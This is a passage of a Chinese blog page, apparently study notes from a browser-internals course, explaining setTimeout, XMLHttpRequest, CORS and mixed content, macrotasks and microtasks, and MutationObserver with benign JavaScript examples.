class="line">setTimeout(() =&gt; &#123;</span><br><span class="line">    MyObj.showName()</span><br><span class="line">&#125;, 1000);</span><br><span class="line">// 或者 function 函数</span><br><span class="line">setTimeout(function() &#123;</span><br><span class="line">  MyObj.showName();</span><br><span class="line">&#125;, 1000)</span><br></pre></td></tr></table></figure><p>第二种是使用 bind 方法，将 showName 绑定在 MyObj 上面，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(MyObj.showName.bind(MyObj), 1000)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>好了，今天我们就介绍到这里，下面我来总结下今天的内容。</p><ul><li>首先，为了支持定时器的实现，浏览器增加了延时队列。</li><li>其次，由于消息队列排队和一些系统级别的限制，通过 setTimeout 设置的回调任务并非总是可以实时地被执行，这样就不能满足一些实时性要求较高的需求了。</li><li>最后，在定时器中使用过程中，还存在一些陷阱，需要你多加注意。</li></ul><p>通过分析和讲解，你会发现函数 setTimeout 在时效性上面有很多先天的不足，所以对于一些时间精度要求比较高的需求，应该有针对性地采取一些其他的方案。</p><h2 id="3-WebAPI：XMLHttpRequest-是怎么实现的？"><a href="#3-WebAPI：XMLHttpRequest-是怎么实现的？" class="headerlink" title="3. WebAPI：XMLHttpRequest 是怎么实现的？"></a>3. WebAPI：XMLHttpRequest 是怎么实现的？</h2><p>在<a href="https://time.geekbang.org/column/article/134456">上一篇文章</a>中我们介绍了 setTimeout 是如何结合渲染进程的循环系统工作的，那本篇文章我们就继续介绍另外一种类型的 WebAPI——XMLHttpRequest。</p><p>自从网页中引入了 JavaScript，我们就可以操作 DOM 树中任意一个节点，例如隐藏 &#x2F; 显示节点、改变颜色、获得或改变文本内容、为元素添加事件响应函数等等， 几乎可以“为所欲为”了。</p><p>不过在 XMLHttpRequest 出现之前，如果服务器数据有更新，依然需要重新刷新整个页面。而 XMLHttpRequest 提供了从 Web 服务器获取数据的能力，如果你想要更新某条数据，只需要通过 XMLHttpRequest 请求服务器提供的接口，就可以获取到服务器的数据，然后再操作 DOM 来更新页面内容，整个过程只需要更新网页的一部分就可以了，而不用像之前那样还得刷新整个页面，这样既有效率又不会打扰到用户。</p><p>关于 XMLHttpRequest，本来我是想一带而过的，后来发现这个 WebAPI 用于教学非常好。首先前面讲了那么网络内容，现在可以通过它把 HTTP 协议实践一遍；其次，XMLHttpRequest 是一个非常典型的 WebAPI，通过它来讲解浏览器是如何实现 WebAPI 的很合适，这对于你理解其他 WebAPI 也有非常大的帮助，同时在这个过程中我们还可以把一些安全问题给串起来。</p><p>但在深入讲解 XMLHttpRequest 之前，我们得先介绍下<strong>同步回调</strong>和<strong>异步回调</strong>这两个概念，这会帮助你更加深刻地理解 WebAPI 是怎么工作的。</p><h3 id="回调函数-VS-系统调用栈"><a href="#回调函数-VS-系统调用栈" class="headerlink" title="回调函数 VS 系统调用栈"></a>回调函数 VS 系统调用栈</h3><p>那什么是回调函数呢（Callback Function）？</p><p>将一个函数作为参数传递给另外一个函数，那作为参数的这个函数就是<strong>回调函数</strong>。简化的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let callback = function()&#123;</span><br><span class="line">    console.log(&#x27;i am do homework&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">function doWork(cb) &#123;</span><br><span class="line">    console.log(&#x27;start do work&#x27;)</span><br><span class="line">    cb()</span><br><span class="line">    console.log(&#x27;end do work&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">doWork(callback)</span><br></pre></td></tr></table></figure><p>在上面示例代码中，我们将一个匿名函数赋值给变量 callback，同时将 callback 作为参数传递给了 doWork() 函数，这时在函数 doWork() 中 callback 就是回调函数。</p><p>上面的回调方法有个特点，就是回调函数 callback 是在主函数 doWork 返回之前执行的，我们把这个回调过程称为<strong>同步回调</strong>。</p><p>既然有同步回调，那肯定也有异步回调。下面我们再来看看异步回调的例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let callback = function()&#123;</span><br><span class="line">    console.log(&#x27;i am do homework&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">function doWork(cb) &#123;</span><br><span class="line">    console.log(&#x27;start do work&#x27;)</span><br><span class="line">    setTimeout(cb,1000)</span><br><span class="line">    console.log(&#x27;end do work&#x27;)</span><br><span class="line">&#125;</span><br><span class="line">doWork(callback)</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用了 setTimeout 函数让 callback 在 doWork 函数执行结束后，又延时了 1 秒再执行，这次 callback 并没有在主函数 doWork 内部被调用，我们把这种回调函数在主函数外部执行的过程称为<strong>异步回调</strong>。</p><p>现在你应该知道什么是同步回调和异步回调了，那下面我们再深入点，站在消息循环的视角来看看同步回调和异步回调的区别。理解了这些，可以让你从本质上理解什么是回调。</p><p>我们还是先来回顾下页面的事件循环系统，通过<a href="https://time.geekbang.org/column/article/132931">《15 | 消息队列和事件循环：页面是怎么“活”起来的？》</a>的学习，你应该已经知道浏览器页面是通过事件循环机制来驱动的，每个渲染进程都有一个消息队列，页面主线程按照顺序来执行消息队列中的事件，如执行 JavaScript 事件、解析 DOM 事件、计算布局事件、用户输入事件等等，如果页面有新的事件产生，那新的事件将会追加到事件队列的尾部。所以可以说是<strong>消息队列和主线程循环机制保证了页面有条不紊地运行</strong>。</p><p>这里还需要补充一点，那就是当循环系统在执行一个任务的时候，都要为这个任务维护一个<strong>系统调用栈</strong>。这个<strong>系统调用栈</strong>类似于 JavaScript 的调用栈，只不过系统调用栈是 Chromium 的开发语言 C++ 来维护的，其完整的调用栈信息你可以通过 chrome:&#x2F;&#x2F;tracing&#x2F; 来抓取。当然，你也可以通过 Performance 来抓取它核心的调用信息，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221257032.png" alt="image-20221014221257032"></p><p>这幅图记录了一个 Parse HTML 的任务执行过程，其中黄色的条目表示执行 JavaScript 的过程，其他颜色的条目表示浏览器内部系统的执行过程。</p><p>通过该图你可以看出来，Parse HTML 任务在执行过程中会遇到一系列的子过程，比如在解析页面的过程中遇到了 JavaScript 脚本，那么就暂停解析过程去执行该脚本，等执行完成之后，再恢复解析过程。然后又遇到了样式表，这时候又开始解析样式表……直到整个任务执行完成。</p><p>需要说明的是，整个 Parse HTML 是一个完整的任务，在执行过程中的脚本解析、样式表解析都是该任务的子过程，其下拉的长条就是执行过程中调用栈的信息。</p><p>每个任务在执行过程中都有自己的调用栈，那么同步回调就是在当前主函数的上下文中执行回调函数，这个没有太多可讲的。下面我们主要来看看异步回调过程，异步回调是指回调函数在主函数之外执行，一般有两种方式：</p><ul><li>第一种是把异步函数做成一个任务，添加到信息队列尾部；</li><li>第二种是把异步函数添加到微任务队列中，这样就可以在当前任务的末尾处执行微任务了。</li></ul><h3 id="XMLHttpRequest-运作机制"><a href="#XMLHttpRequest-运作机制" class="headerlink" title="XMLHttpRequest 运作机制"></a>XMLHttpRequest 运作机制</h3><p>理解了什么是同步回调和异步回调，接下来我们就来分析 XMLHttpRequest 背后的实现机制，具体工作过程你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221310605.png" alt="image-20221014221310605"></p><p>这是 XMLHttpRequest 的总执行流程图，下面我们就来分析从发起请求到接收数据的完整流程。</p><p>我们先从 XMLHttpRequest 的用法开始，首先看下面这样一段请求代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> function GetWebData(URL)&#123;</span><br><span class="line">    /**</span><br><span class="line">     * 1: 新建 XMLHttpRequest 请求对象</span><br><span class="line">     */</span><br><span class="line">    let xhr = new XMLHttpRequest()</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 2: 注册相关事件回调处理函数</span><br><span class="line">     */</span><br><span class="line">    xhr.onreadystatechange = function () &#123;</span><br><span class="line">        switch(xhr.readyState)&#123;</span><br><span class="line">          case 0: // 请求未初始化</span><br><span class="line">            console.log(&quot; 请求未初始化 &quot;)</span><br><span class="line">            break;</span><br><span class="line">          case 1://OPENED</span><br><span class="line">            console.log(&quot;OPENED&quot;)</span><br><span class="line">            break;</span><br><span class="line">          case 2://HEADERS_RECEIVED</span><br><span class="line">            console.log(&quot;HEADERS_RECEIVED&quot;)</span><br><span class="line">            break;</span><br><span class="line">          case 3://LOADING</span><br><span class="line">            console.log(&quot;LOADING&quot;)</span><br><span class="line">            break;</span><br><span class="line">          case 4://DONE</span><br><span class="line">            if(this.status == 200||this.status == 304)&#123;</span><br><span class="line">                console.log(this.responseText);</span><br><span class="line">                &#125;</span><br><span class="line">            console.log(&quot;DONE&quot;)</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xhr.ontimeout = function(e) &#123; console.log(&#x27;ontimeout&#x27;) &#125;</span><br><span class="line">    xhr.onerror = function(e) &#123; console.log(&#x27;onerror&#x27;) &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 3: 打开请求</span><br><span class="line">     */</span><br><span class="line">    xhr.open(&#x27;Get&#x27;, URL, true);// 创建一个 Get 请求, 采用异步</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 4: 配置参数</span><br><span class="line">     */</span><br><span class="line">    xhr.timeout = 3000 // 设置 xhr 请求的超时时间</span><br><span class="line">    xhr.responseType = &quot;text&quot; // 设置响应返回的数据格式</span><br><span class="line">    xhr.setRequestHeader(&quot;X_TEST&quot;,&quot;time.geekbang&quot;)</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 5: 发送请求</span><br><span class="line">     */</span><br><span class="line">    xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面是一段利用了 XMLHttpRequest 来请求数据的代码，再结合上面的流程图，我们可以分析下这段代码是怎么执行的。</p><p><strong>第一步：创建 XMLHttpRequest 对象。</strong></p><p>当执行到<code>let xhr = new XMLHttpRequest()</code>后，JavaScript 会创建一个 XMLHttpRequest 对象<strong>xhr</strong>，用来执行实际的网络请求操作。</p><p><strong>第二步：为 xhr 对象注册回调函数。</strong></p><p>因为网络请求比较耗时，所以要注册回调函数，这样后台任务执行完成之后就会通过调用回调函数来告诉其执行结果。</p><p>XMLHttpRequest 的回调函数主要有下面几种：</p><ul><li>ontimeout，用来监控超时请求，如果后台请求超时了，该函数会被调用；</li><li>onerror，用来监控出错信息，如果后台请求出错了，该函数会被调用；</li><li>onreadystatechange，用来监控后台请求过程中的状态，比如可以监控到 HTTP 头加载完成的消息、HTTP 响应体消息以及数据加载完成的消息等。</li></ul><p><strong>第三步：配置基础的请求信息。</strong></p><p>注册好回调事件之后，接下来就需要配置基础的请求信息了，首先要通过 open 接口配置一些基础的请求信息，包括请求的地址、请求方法（是 get 还是 post）和请求方式（同步还是异步请求）。</p><p>然后通过 xhr 内部属性类配置一些其他可选的请求信息，你可以参考文中示例代码，我们通过<code>xhr.timeout = 3000</code>来配置超时时间，也就是说如果请求超过 3000 毫秒还没有响应，那么这次请求就被判断为失败了。</p><p>我们还可以通过<code>xhr.responseType = &quot;text&quot;</code>来配置服务器返回的格式，将服务器返回的数据自动转换为自己想要的格式，如果将 responseType 的值设置为 json，那么系统会自动将服务器返回的数据转换为 JavaScript 对象格式。下面的图表是我列出的一些返回类型的描述：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221322880.png" alt="image-20221014221322880"></p><p>假如你还需要添加自己专用的请求头属性，可以通过 xhr.setRequestHeader 来添加。</p><p><strong>第四步：发起请求。</strong></p><p>一切准备就绪之后，就可以调用<code>xhr.send</code>来发起网络请求了。你可以对照上面那张请求流程图，可以看到：渲染进程会将请求发送给网络进程，然后网络进程负责资源的下载，等网络进程接收到数据之后，就会利用 IPC 来通知渲染进程；渲染进程接收到消息之后，会将 xhr 的回调函数封装成任务并添加到消息队列中，等主线程循环系统执行到该任务的时候，就会根据相关的状态来调用对应的回调函数。</p><ul><li>如果网络请求出错了，就会执行 xhr.onerror；</li><li>如果超时了，就会执行 xhr.ontimeout；</li><li>如果是正常的数据接收，就会执行 onreadystatechange 来反馈相应的状态。</li></ul><p>这就是一个完整的 XMLHttpRequest 请求流程，如果你感兴趣，可以参考下 Chromium 对 XMLHttpRequest 的实现，<a href="https://chromium.googlesource.com/chromium/src/+/refs/heads/master/third_party/blink/renderer/core/xmlhttprequest/">点击这里查看代码</a>。</p><h3 id="XMLHttpRequest-使用过程中的“坑”"><a href="#XMLHttpRequest-使用过程中的“坑”" class="headerlink" title="XMLHttpRequest 使用过程中的“坑”"></a>XMLHttpRequest 使用过程中的“坑”</h3><p>上述过程看似简单，但由于浏览器很多安全策略的限制，所以会导致你在使用过程中踩到非常多的“坑”。</p><p>浏览器安全问题是前端工程师避不开的一道坎，通常在使用过程中遇到的“坑”，很大一部分都是由安全策略引起的，不管你喜不喜欢，它都在这里。本来很完美的一个方案，正是由于加了安全限制，导致使用起来非常麻烦。</p><p>而你要做的就是去正视这各种的安全问题。也就是说要想更加完美地使用 XMLHttpRequest，你就要了解浏览器的安全策略。</p><p>下面我们就来看看在使用 XMLHttpRequest 的过程中所遇到的跨域问题和混合内容问题。</p><h4 id="1-跨域问题"><a href="#1-跨域问题" class="headerlink" title="1. 跨域问题"></a>1. 跨域问题</h4><p>比如在极客邦的官网使用 XMLHttpRequest 请求极客时间的页面内容，由于极客邦的官网是<a href="https://www.geekbang.org/">www.geekbang.org</a>，极客时间的官网是<a href="https://time.geekbang.org/">time.geekbang.org</a>，它们不是同一个源，所以就涉及到了跨域（在 A 站点中去访问不同源的 B 站点的内容）。默认情况下，跨域请求是不被允许的，你可以看下面的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest()</span><br><span class="line">var url = &#x27;https://time.geekbang.org/&#x27;</span><br><span class="line">function handler() &#123;</span><br><span class="line">    switch(xhr.readyState)&#123;</span><br><span class="line">        case 0: // 请求未初始化</span><br><span class="line">        console.log(&quot; 请求未初始化 &quot;)</span><br><span class="line">        break;</span><br><span class="line">        case 1://OPENED</span><br><span class="line">        console.log(&quot;OPENED&quot;)</span><br><span class="line">        break;</span><br><span class="line">        case 2://HEADERS_RECEIVED</span><br><span class="line">        console.log(&quot;HEADERS_RECEIVED&quot;)</span><br><span class="line">        break;</span><br><span class="line">        case 3://LOADING</span><br><span class="line">        console.log(&quot;LOADING&quot;)</span><br><span class="line">        break;</span><br><span class="line">        case 4://DONE</span><br><span class="line">        if(this.status == 200||this.status == 304)&#123;</span><br><span class="line">            console.log(this.responseText);</span><br><span class="line">            &#125;</span><br><span class="line">        console.log(&quot;DONE&quot;)</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function callOtherDomain() &#123;</span><br><span class="line">  if(xhr) &#123;</span><br><span class="line">    xhr.open(&#x27;GET&#x27;, url, true)</span><br><span class="line">    xhr.onreadystatechange = handler</span><br><span class="line">    xhr.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">callOtherDomain()</span><br></pre></td></tr></table></figure><p>你可以在控制台测试下。首先通过浏览器打开<a href="https://www.geekbang.org/">www.geekbang.org</a>，然后打开控制台，在控制台输入以上示例代码，再执行，会看到请求被 Block 了。控制台的提示信息如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;https://time.geekbang.org/&#x27; from origin &#x27;https://www.geekbang.org&#x27; has been blocked by CORS policy: No &#x27;Access-Control-Allow-Origin&#x27; header is present on the requested resource.</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>因为 <a href="http://www.geekbang.org/">www.geekbang.org</a> 和 time.geekbang.com 不属于一个域，所以以上访问就属于跨域访问了，这次访问失败就是由于跨域问题导致的。</p><h4 id="2-HTTPS-混合内容的问题"><a href="#2-HTTPS-混合内容的问题" class="headerlink" title="2. HTTPS 混合内容的问题"></a>2. HTTPS 混合内容的问题</h4><p>了解完跨域问题后，我们再来看看 HTTPS 的混合内容。HTTPS 混合内容是 HTTPS 页面中包含了不符合 HTTPS 安全要求的内容，比如包含了 HTTP 资源，通过 HTTP 加载的图像、视频、样式表、脚本等，都属于混合内容。</p><p>通常，如果 HTTPS 请求页面中使用混合内容，浏览器会针对 HTTPS 混合内容显示警告，用来向用户表明此 HTTPS 页面包含不安全的资源。比如打开站点 <a href="https://www.iteye.com/groups">https://www.iteye.com/groups</a> ，可以通过控制台看到混合内容的警告，参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221339653.png" alt="image-20221014221339653"></p><p>从上图可以看出，通过 HTML 文件加载的混合资源，虽然给出警告，但大部分类型还是能加载的。而使用 XMLHttpRequest 请求时，浏览器认为这种请求可能是攻击者发起的，会阻止此类危险的请求。比如我通过浏览器打开地址 <a href="https://www.iteye.com/groups">https://www.iteye.com/groups</a> ，然后通过控制台，使用 XMLHttpRequest 来请求 <a href="http://img-ads.csdn.net/2018/201811150919211586.jpg">http://img-ads.csdn.net/2018/201811150919211586.jpg</a> ，这时候请求就会报错，出错信息如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221349962.png" alt="image-20221014221349962"></p><h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3><p>好了，今天我们就讲到这里，下面我来总结下今天的内容。</p><p>首先我们介绍了回调函数和系统调用栈；接下来我们站在循环系统的视角，分析了 XMLHttpRequest 是怎么工作的；最后又说明了由于一些安全因素的限制，在使用 XMLHttpRequest 的过程中会遇到跨域问题和混合内容的问题。</p><p>本篇文章跨度比较大，不是单纯地讲一个问题，而是将回调类型、循环系统、网络请求和安全问题“串联”起来了。</p><p>对比<a href="https://time.geekbang.org/column/article/134456">上一篇文章</a>，setTimeout 是直接将延迟任务添加到延迟队列中，而 XMLHttpRequest 发起请求，是由浏览器的其他进程或者线程去执行，然后再将执行结果利用 IPC 的方式通知渲染进程，之后渲染进程再将对应的消息添加到消息队列中。如果你搞懂了 setTimeout 和 XMLHttpRequest 的工作机制后，再来理解其他 WebAPI 就会轻松很多了，因为大部分 WebAPI 的工作逻辑都是类似的。</p><h2 id="4-宏任务和微任务：不是所有任务都是一个待遇"><a href="#4-宏任务和微任务：不是所有任务都是一个待遇" class="headerlink" title="4. 宏任务和微任务：不是所有任务都是一个待遇"></a>4. 宏任务和微任务：不是所有任务都是一个待遇</h2><p>在前面几篇文章中，我们介绍了消息队列，并结合消息队列介绍了两种典型的 WebAPI——<strong>setTimeout</strong>和<strong>XMLHttpRequest</strong>，通过这两个 WebAPI 我们搞清楚了浏览器的消息循环系统是怎么工作的。不过随着浏览器的应用领域越来越广泛，消息队列中这种粗时间颗粒度的任务已经不能胜任部分领域的需求，所以又出现了一种新的技术——<strong>微任务</strong>。<strong>微任务可以在实时性和效率之间做一个有效的权衡</strong>。</p><p>从目前的情况来看，微任务已经被广泛地应用，基于微任务的技术有 MutationObserver、Promise 以及以 Promise 为基础开发出来的很多其他的技术。所以微任务的重要性也与日俱增，了解其底层的工作原理对于你读懂别人的代码，以及写出更高效、更具现代的代码有着决定性的作用。</p><p>有微任务，也就有宏任务，那这二者到底有什么区别？它们又是如何相互取长补短的？</p><h3 id="宏任务"><a href="#宏任务" class="headerlink" title="宏任务"></a>宏任务</h3><p>前面我们已经介绍过了，页面中的大部分任务都是在主线程上执行的，这些任务包括了：</p><ul><li>渲染事件（如解析 DOM、计算布局、绘制）；</li><li>用户交互事件（如鼠标点击、滚动页面、放大缩小等）；</li><li>JavaScript 脚本执行事件；</li><li>网络请求完成、文件读写完成事件。</li></ul><p>为了协调这些任务有条不紊地在主线程上执行，页面进程引入了消息队列和事件循环机制，渲染进程内部会维护多个消息队列，比如延迟执行队列和普通的消息队列。然后主线程采用一个 for 循环，不断地从这些任务队列中取出任务并执行任务。我们把这些消息队列中的任务称为<strong>宏任务</strong>。</p><p>消息队列中的任务是通过事件循环系统来执行的，这里我们可以看看在<a href="https://html.spec.whatwg.org/multipage/webappapis.html#event-loop-processing-model">WHATWG 规范</a>中是怎么定义事件循环机制的。</p><p>由于规范需要支持语义上的完备性，所以通常写得都会比较啰嗦，这里我就大致总结了下 WHATWG 规范定义的大致流程：</p><ul><li>先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask；</li><li>然后循环系统记录任务开始执行的时间，并把这个 oldestTask 设置为当前正在执行的任务；</li><li>当任务执行完成之后，删除当前正在执行的任务，并从对应的消息队列中删除掉这个 oldestTask；</li><li>最后统计执行完成的时长等信息。</li></ul><p>以上就是消息队列中宏任务的执行过程，通过前面的学习，相信你也很熟悉这套执行流程了。</p><p>宏任务可以满足我们大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，下面我们就来分析下为什么宏任务难以满足对时间精度要求较高的任务。</p><p>前面我们说过，页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。为了直观理解，你可以看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id=&#x27;demo&#x27;&gt;</span><br><span class="line">            &lt;ol&gt;</span><br><span class="line">                &lt;li&gt;test&lt;/li&gt;</span><br><span class="line">            &lt;/ol&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        function timerCallback2()&#123;</span><br><span class="line">          console.log(2)</span><br><span class="line">        &#125;</span><br><span class="line">        function timerCallback()&#123;</span><br><span class="line">            console.log(1)</span><br><span class="line">            setTimeout(timerCallback2,0)</span><br><span class="line">        &#125;</span><br><span class="line">        setTimeout(timerCallback,0)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在这段代码中，我的目的是想通过 setTimeout 来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。</p><p>但实际情况是我们不能控制的，比如在你调用 setTimeout 来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。你可以打开 Performance 工具，来记录下这段任务的执行过程，也可参考文中我记录的图片：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221456025.png" alt="image-20221014221456025"></p><p>Performance 记录</p><p>setTimeout 函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是 setTimeout 触发的两个定时器任务。</p><p>现在你可以重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。试想一下，如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。</p><p>所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如后面要介绍的监听 DOM 变化的需求。</p><h3 id="微任务"><a href="#微任务" class="headerlink" title="微任务"></a>微任务</h3><p>在理解了宏任务之后，下面我们就可以来看看什么是微任务了。在<a href="https://time.geekbang.org/column/article/135127">上一篇文章</a>中，我们介绍过异步回调的概念，其主要有两种方式。</p><p><strong>第一种是把异步回调函数封装成一个宏任务，添加到消息队列尾部，当循环系统执行到该任务的时候执行回调函数</strong>。这种比较好理解，我们前面介绍的 setTimeout 和 XMLHttpRequest 的回调函数都是通过这种方式来实现的。</p><p><strong>第二种方式的执行时机是在主函数执行结束之后、当前宏任务结束之前执行回调函数，这通常都是以微任务形式体现的。</strong></p><p>那这里说的微任务到底是什么呢？</p><p><strong>微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。</strong></p><p>不过要搞清楚微任务系统是怎么运转起来的，就得站在 V8 引擎的层面来分析下。</p><p>我们知道当 JavaScript 执行一段脚本的时候，V8 会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8 引擎也会在内部创建一个<strong>微任务队列</strong>。顾名思义，这个微任务队列就是用来存放微任务的，因为在当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务了。不过这个微任务队列是给 V8 引擎内部使用的，所以你是无法通过 JavaScript 直接访问的。</p><p>也就是说每个宏任务都关联了一个微任务队列。那么接下来，我们就需要分析两个重要的时间点——微任务产生的时机和执行微任务队列的时机。</p><p>我们先来看看微任务是怎么产生的？在现代浏览器里面，产生微任务有两种方式。</p><p>第一种方式是使用 MutationObserver 监控某个 DOM 节点，然后再通过 JavaScript 来修改这个节点，或者为这个节点添加、删除部分子节点，当 DOM 节点发生变化时，就会产生 DOM 变化记录的微任务。</p><p>第二种方式是使用 Promise，当调用 Promise.resolve() 或者 Promise.reject() 的时候，也会产生微任务。</p><p>通过 DOM 节点变化产生的微任务或者使用 Promise 产生的微任务都会被 JavaScript 引擎按照顺序保存到微任务队列中。</p><p>好了，现在微任务队列中有了微任务了，那接下来就要看看微任务队列是何时被执行的。</p><p>通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。<strong>WHATWG 把执行微任务的时间点称为检查点</strong>。当然除了在退出全局执行上下文式这个检查点之外，还有其他的检查点，不过不是太重要，这里就不做介绍了。</p><p>如果在执行微任务的过程中，产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎一直循环执行微任务队列中的任务，直到队列为空才算执行结束。也就是说在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行。</p><p>为了直观地理解什么是微任务，你可以参考下面我画的示意图（由于内容比较多，我将其分为了两张）：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221513756.png" alt="image-20221014221513756"></p><p>该示意图是在执行一个 ParseHTML 的宏任务，在执行过程中，遇到了 JavaScript 脚本，那么就暂停解析流程，进入到 JavaScript 的执行环境。从图中可以看到，全局上下文中包含了微任务列表。</p><p>在 JavaScript 脚本的后续执行过程中，分别通过 Promise 和 removeChild 创建了两个微任务，并被添加到微任务列表中。接着 JavaScript 执行结束，准备退出全局执行上下文，这时候就到了检查点了，JavaScript 引擎会检查微任务列表，发现微任务列表中有微任务，那么接下来，依次执行这两个微任务。等微任务队列清空之后，就退出全局执行上下文。</p><p>以上就是微任务的工作流程，从上面分析我们可以得出如下几个<strong>结论</strong>：</p><ul><li>微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。</li><li>微任务的执行时长会影响到当前宏任务的时长。比如一个宏任务在执行过程中，产生了 100 个微任务，执行每个微任务的时间是 10 毫秒，那么执行这 100 个微任务的时间就是 1000 毫秒，也可以说这 100 个微任务让宏任务的执行时间延长了 1000 毫秒。所以你在写代码的时候一定要注意控制微任务的执行时长。</li><li>在一个宏任务中，分别创建一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于宏任务执行。</li></ul><h3 id="监听-DOM-变化方法演变"><a href="#监听-DOM-变化方法演变" class="headerlink" title="监听 DOM 变化方法演变"></a>监听 DOM 变化方法演变</h3><p>现在知道了微任务是怎么工作的，那接下来我们再来看看微任务是如何应用在 MutationObserver 中的。MutationObserver 是用来监听 DOM 变化的一套方法，而监听 DOM 变化一直是前端工程师一项非常核心的需求。</p><p>比如许多 Web 应用都利用 HTML 与 JavaScript 构建其自定义控件，与一些内置控件不同，这些控件不是固有的。为了与内置控件一起良好地工作，这些控件必须能够适应内容更改、响应事件和用户交互。因此，Web 应用需要<strong>监视 DOM 变化并及时地做出响应</strong>。</p><p>虽然监听 DOM 的需求是如此重要，不过早期页面并没有提供对监听的支持，所以那时要观察 DOM 是否变化，唯一能做的就是轮询检测，比如使用 setTimeout 或者 setInterval 来定时检测 DOM 是否有改变。这种方式简单粗暴，但是会遇到两个问题：如果时间间隔设置过长，DOM 变化响应不够及时；反过来如果时间间隔设置过短，又会浪费很多无用的工作量去检查 DOM，会让页面变得低效。</p><p>直到 2000 年的时候引入了 Mutation Event，Mutation Event 采用了<strong>观察者的设计模式</strong>，当 DOM 有变动时就会立刻触发相应的事件，这种方式属于同步回调。</p><p>采用 Mutation Event 解决了实时性的问题，因为 DOM 一旦发生变化，就会立即调用 JavaScript 接口。但也正是这种实时性造成了严重的性能问题，因为每次 DOM 变动，渲染引擎都会去调用 JavaScript，这样会产生较大的性能开销。比如利用 JavaScript 动态创建或动态修改 50 个节点内容，就会触发 50 次回调，而且每个回调函数都需要一定的执行时间，这里我们假设每次回调的执行时间是 4 毫秒，那么 50 次回调的执行时间就是 200 毫秒，若此时浏览器正在执行一个动画效果，由于 Mutation Event 触发回调事件，就会导致动画的卡顿。</p><p>也正是因为使用 Mutation Event 会导致页面性能问题，所以 Mutation Event 被反对使用，并逐步从 Web 标准事件中删除了。</p><p>为了解决了 Mutation Event 由于同步调用 JavaScript 而造成的性能问题，从 DOM4 开始，推荐使用 MutationObserver 来代替 Mutation Event。MutationObserver API 可以用来监视 DOM 的变化，包括属性的变化、节点的增减、内容的变化等。</p><p>那么相比较 Mutation Event，MutationObserver 到底做了哪些改进呢？</p><p>首先，MutationObserver 将响应函数改成异步调用，可以不用在每次 DOM 变化都触发异步调用，而是等多次 DOM 